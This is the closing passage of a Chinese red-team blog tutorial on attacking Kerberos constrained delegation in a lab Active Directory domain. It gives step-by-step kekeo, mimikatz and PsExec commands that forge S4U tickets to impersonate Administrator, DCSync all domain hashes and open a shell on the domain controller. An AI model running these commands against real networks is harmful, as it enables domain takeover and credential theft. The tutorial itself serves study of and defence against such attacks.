+<h4 id="方法4：使用机器账户的Hash值-kekeo"><a href="#方法4：使用机器账户的Hash值-kekeo" class="headerlink" title="方法4：使用机器账户的Hash值 | kekeo"></a>方法4：使用机器账户的Hash值 | kekeo</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgt::ask /user:web-2012$ /domain:redteam.red /NTLM:40ee25b2c3f7ac3370429b18aca51e81"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请administrator权限的票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"tgs::s4u /tgt:TGT_web-2012$@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:ldap/ad02-2016.redteam.red"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## kekeo注入票据</span></span><br><span class="line">.\kekeo.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@redteam.red_ldap~ad02-2016.redteam.red@redteam.red.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mimikatz通过ldap服务导出hash</span></span><br><span class="line">.\mimikatz.exe <span class="string">"kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_ldap~ad02-2016.redteam.red@REDTEAM.RED.kirbi"</span> <span class="string">"lsadump::dcsync /domain:redteam.com /all /csv"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir \\ad02-<span class="number">2016</span>.redteam.red\c$</span><br><span class="line"></span><br><span class="line"><span class="comment"># psexec</span></span><br><span class="line">.\Psexec.exe -accepteula \\ad02-<span class="number">2016</span>.redteam.red cmd</span><br></pre></td></tr></table></figure>
+<p><img src="8.png" alt="image.png"><br>ldap账户<br><img src="9.png" alt="image.png"></p>
+<h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><blockquote>
+<p>域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</p>
+</blockquote>
+<h4 id="方法1：使用服务账户的票据-kekeo"><a href="#方法1：使用服务账户的票据-kekeo" class="headerlink" title="方法1：使用服务账户的票据 | kekeo"></a>方法1：使用服务账户的票据 | kekeo</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 通过<span class="selector-tag">kekeo</span>请求服务用户的<span class="selector-tag">TGT</span></span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:saulgoodman</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.red</span> /<span class="selector-tag">password</span><span class="selector-pseudo">:Saul</span>!@<span class="selector-id">#456</span> /<span class="selector-tag">ticket</span><span class="selector-pseudo">:test.kirbi</span></span><br><span class="line"></span><br><span class="line">## 同理此处利用<span class="selector-tag">ntlm</span> <span class="selector-tag">hash</span>也是可以进行请求的</span><br><span class="line"><span class="selector-tag">tgt</span><span class="selector-pseudo">::ask</span> /<span class="selector-tag">user</span><span class="selector-pseudo">:websec</span> /<span class="selector-tag">domain</span><span class="selector-pseudo">:redteam.club</span> /<span class="selector-tag">NTLM</span><span class="selector-pseudo">:XXXXX</span></span><br></pre></td></tr></table></figure>
+<p><img src="10.png" alt="image.png"></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用票据通过伪造S4U请求以administrator身份访问websec的ST</span></span><br><span class="line">tgs::s4u /<span class="symbol">tgt:</span>TGT_saulgoodman<span class="variable">@REDTEAM</span>.RED_krbtgt~redteam.red<span class="variable">@REDTEAM</span>.RED.kirbi /<span class="symbol">user:</span>Administrator<span class="variable">@redteam</span>.red /<span class="symbol">service:</span>cifs/AD02<span class="number">-2016</span>.redteam.red</span><br></pre></td></tr></table></figure>
+<p><img src="11.png" alt="image.png"></p>
+<p>kekeo当前路径下会出现administrator的ticket (用于访问saulgoodman的CIFS服务), 访问saulgoodman的cifs服务: 使用kekeo导入票据访问域控。<br><strong>cifs服务</strong></p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## kekeo导入这个tiket</span></span><br><span class="line">kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD02-<span class="number">2016.redteam</span>.red@REDTEAM.RED.kirbi</span><br><span class="line"></span><br><span class="line"><span class="comment">## cmd</span></span><br><span class="line">.<span class="string">\PsExec.exe</span> <span class="string">\\ad02-2016.redteam.red</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="comment">## dir</span></span><br><span class="line">dir <span class="string">\\ad02-2016.redteam.red\c$</span></span><br></pre></td></tr></table></figure>
+<p><img src="12.png" alt="image.png"></p>
+<p><img src="13.png" alt="image.png"></p>
+<p><strong>ldap服务</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## <span class="selector-tag">mimikatz</span>导入<span class="selector-tag">ptt</span></span><br><span class="line"><span class="selector-tag">kerberos</span><span class="selector-pseudo">::ptt</span> <span class="selector-tag">TGS_Administrator</span><span class="keyword">@redteam</span>.red<span class="keyword">@REDTEAM</span>.RED_cifs~AD02-2016.redteam.red<span class="keyword">@REDTEAM</span>.RED.kirbi</span><br><span class="line"></span><br><span class="line">## mimikatz不用本机管理员，导入kiket即可不用 <span class="string">"privilege::debug"</span></span><br><span class="line"><span class="attribute">lsadump:</span>:dcsync /<span class="attribute">domain:</span>redteam.com /all /csv</span><br></pre></td></tr></table></figure>
+<p><img src="14.png" alt="image.png"></p>
+<p><img src="15.png" alt="image.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/23/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" rel="prev" title="非约束性委派">
+      <i class="fa fa-chevron-left"></i> 非约束性委派
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念"><span class="nav-number">1.</span> <span class="nav-text">概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#S4u2self-amp-S4U2proxy"><span class="nav-number">1.1.</span> <span class="nav-text">S4u2self &amp; S4U2proxy</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境介绍"><span class="nav-number">2.</span> <span class="nav-text">环境介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建环境"><span class="nav-number">3.</span> <span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#约束委派服务账户特征"><span class="nav-number">4.</span> <span class="nav-text">约束委派服务账户特征</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查询方法"><span class="nav-number">5.</span> <span class="nav-text">查询方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法1：ADFind"><span class="nav-number">5.0.1.</span> <span class="nav-text">方法1：ADFind</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法2：SharpView"><span class="nav-number">5.0.2.</span> <span class="nav-text">方法2：SharpView</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击思路"><span class="nav-number">6.</span> <span class="nav-text">攻击思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#机器账户"><span class="nav-number">6.1.</span> <span class="nav-text">机器账户</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法1：使用机器账户的票据-kekeo"><span class="nav-number">6.1.1.</span> <span class="nav-text">方法1：使用机器账户的票据 | kekeo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法2：使用机器账户的Hash值-Rubeus"><span class="nav-number">6.1.2.</span> <span class="nav-text">方法2：使用机器账户的Hash值 | Rubeus</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法3：使用机器账户的Hash值-getST"><span class="nav-number">6.1.3.</span> <span class="nav-text">方法3：使用机器账户的Hash值 | getST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法4：使用机器账户的Hash值-kekeo"><span class="nav-number">6.1.4.</span> <span class="nav-text">方法4：使用机器账户的Hash值 | kekeo</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务账户"><span class="nav-number">6.2.</span> <span class="nav-text">服务账户</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法1：使用服务账户的票据-kekeo"><span class="nav-number">6.2.1.</span> <span class="nav-text">方法1：使用服务账户的票据 | kekeo</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
